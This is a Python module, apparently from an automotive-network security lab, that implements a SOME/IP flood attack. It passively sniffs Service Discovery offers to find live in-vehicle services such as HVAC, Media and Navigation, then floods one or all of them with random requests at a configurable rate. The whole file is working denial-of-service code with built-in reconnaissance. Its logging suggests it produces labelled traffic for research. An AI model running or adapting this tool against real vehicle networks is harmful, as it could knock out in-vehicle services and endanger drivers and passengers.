"""
Flood attack — sends rapid-fire SOME/IP requests to overwhelm a target service.

Supports two modes:
  - Default: uses hardcoded service IDs from constants (simple demo mode)
  - --recon: passively listens for SD Offer broadcasts first, discovers
    service/method IDs from the network, then floods only using IDs it
    legitimately observed — no imported constants needed.

Usage:
    python -m attacks.flood [--target-service HVAC] [--duration 10] [--rate 200]
    python -m attacks.flood --recon --recon-time 5 --duration 10 --rate 200
"""

from __future__ import annotations

import argparse
import logging
import os
import random
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, pack_someip, MessageType
from proto.sd import SdEntryType, parse_sd_message
from proto.constants import SERVICES, HVAC_SERVICE_ID, MEDIA_SERVICE_ID, NAV_SERVICE_ID, SD_PORT
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FLOOD] %(message)s")
log = logging.getLogger("Flood")

SERVICE_MAP = {
    "HVAC": HVAC_SERVICE_ID,
    "Media": MEDIA_SERVICE_ID,
    "Navigation": NAV_SERVICE_ID,
}


def recon_discover_services(listen_time: float = 5.0, sd_port: int = SD_PORT) -> list[dict]:
    """Passively sniff SD Offer broadcasts and discover services.

    Returns a list of dicts with keys: service_id, instance_id, ip, port.
    No imported constants are used — everything is learned from the wire.
    """
    log.info("RECON: Listening for SD Offers for %.1fs on port %d...", listen_time, sd_port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(1.0)
    sock.bind(("0.0.0.0", sd_port))

    discovered: dict[int, dict] = {}  # service_id -> info
    start = time.time()

    while time.time() - start < listen_time:
        try:
            data, addr = sock.recvfrom(65535)
            entries = parse_sd_message(data)
            for entry in entries:
                if entry.entry_type == SdEntryType.OFFER_SERVICE and entry.ttl > 0:
                    sid = entry.service_id
                    if sid not in discovered:
                        ip = entry.option.ip if entry.option else addr[0]
                        port = entry.option.port if entry.option else addr[1]
                        discovered[sid] = {
                            "service_id": sid,
                            "instance_id": entry.instance_id,
                            "ip": ip,
                            "port": port,
                        }
                        log.info(
                            "RECON: Discovered service 0x%04X at %s:%d",
                            sid, ip, port,
                        )
        except socket.timeout:
            continue
        except Exception as e:
            log.warning("RECON: receive error: %s", e)

    sock.close()
    log.info("RECON: Discovered %d services", len(discovered))
    return list(discovered.values())


def generate_payload_for_service(service_id: int) -> bytes:
    """Generate a realistic-looking payload based on observed service ID.

    In recon mode we don't know the method semantics, so we generate
    plausible payloads based on typical SOME/IP patterns.
    """
    # Random payload of typical RPC sizes (4-64 bytes)
    size = random.choice([4, 6, 8, 12, 16, 32])
    return bytes(random.randint(0, 255) for _ in range(size))


def flood_target(
    target_ip: str,
    target_port: int,
    service_id: int,
    method_ids: list[int],
    duration: float,
    rate: int,
    logger,
    log_path: str,
) -> int:
    """Core flood loop. Returns number of messages sent."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)

    interval = 1.0 / rate
    session_counter = 0
    msg_count = 0
    start_time = time.time()

    log.info(
        "FLOOD starting: service 0x%04X at %s:%d — %d msg/s for %.1fs",
        service_id, target_ip, target_port, rate, duration,
    )

    while time.time() - start_time < duration:
        session_counter = (session_counter % 0xFFFF) + 1
        method_id = random.choice(method_ids)

        header = SomeIpHeader(
            service_id=service_id,
            method_id=method_id,
            client_id=0x00FF,
            session_id=session_counter,
            message_type=MessageType.REQUEST,
        )
        payload = generate_payload_for_service(service_id)
        msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))

        try:
            sock.sendto(msg_bytes, (target_ip, target_port))
        except Exception as e:
            log.warning("Send failed: %s", e)

        if msg_count % 10 == 0:
            logger.log(
                header, payload, direction="sent",
                src_ip="attacker", dst_ip=target_ip,
                label="flood",
            )

        msg_count += 1
        elapsed = time.time() - start_time
        expected = msg_count * interval
        if expected > elapsed:
            time.sleep(expected - elapsed)

    actual_duration = time.time() - start_time
    actual_rate = msg_count / actual_duration if actual_duration > 0 else 0

    log.info(
        "FLOOD complete: %d messages in %.1fs (%.0f msg/s actual)",
        msg_count, actual_duration, actual_rate,
    )
    sock.close()
    return msg_count


def main():
    parser = argparse.ArgumentParser(description="SOME/IP Flood Attack")
    parser.add_argument("--target-service", choices=["HVAC", "Media", "Navigation"], default="HVAC",
                        help="Target service (ignored in --recon mode)")
    parser.add_argument("--target-ip", default="172.20.0.10",
                        help="Target IP (ignored in --recon mode)")
    parser.add_argument("--target-port", type=int, default=None,
                        help="Target port (ignored in --recon mode)")
    parser.add_argument("--duration", type=float, default=10, help="Attack duration in seconds")
    parser.add_argument("--rate", type=int, default=200, help="Messages per second")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")

    # Recon mode
    parser.add_argument("--recon", action="store_true",
                        help="Discover targets from SD broadcasts instead of using hardcoded IDs")
    parser.add_argument("--recon-time", type=float, default=5.0,
                        help="How long to listen for SD offers during recon (seconds)")
    parser.add_argument("--recon-target-index", type=int, default=0,
                        help="Which discovered service to target (0=first, -1=all)")

    args = parser.parse_args()
    logger = get_logger(args.log_path)

    if args.recon:
        # ---- RECON MODE: discover targets from the network ----
        services = recon_discover_services(args.recon_time)

        if not services:
            log.error("RECON: No services discovered. Is the network running?")
            sys.exit(1)

        if args.recon_target_index == -1:
            # Flood all discovered services
            targets = services
        else:
            idx = min(args.recon_target_index, len(services) - 1)
            targets = [services[idx]]

        for target in targets:
            # In recon mode, we don't know the real method IDs.
            # Use common method IDs (0x0001-0x0005) — a real attacker
            # would probe or fuzz to discover these.
            method_ids = [0x0001, 0x0002, 0x0003]
            flood_target(
                target_ip=target["ip"],
                target_port=target["port"],
                service_id=target["service_id"],
                method_ids=method_ids,
                duration=args.duration,
                rate=args.rate,
                logger=logger,
                log_path=args.log_path,
            )
    else:
        # ---- DEFAULT MODE: use hardcoded constants ----
        service_id = SERVICE_MAP[args.target_service]
        target_port = args.target_port or SERVICES[service_id]["port"]
        target_ip = args.target_ip
        method_ids = list(SERVICES[service_id]["methods"].values())

        # Use service-specific realistic payloads in default mode
        flood_target(
            target_ip=target_ip,
            target_port=target_port,
            service_id=service_id,
            method_ids=method_ids,
            duration=args.duration,
            rate=args.rate,
            logger=logger,
            log_path=args.log_path,
        )


if __name__ == "__main__":
    main()
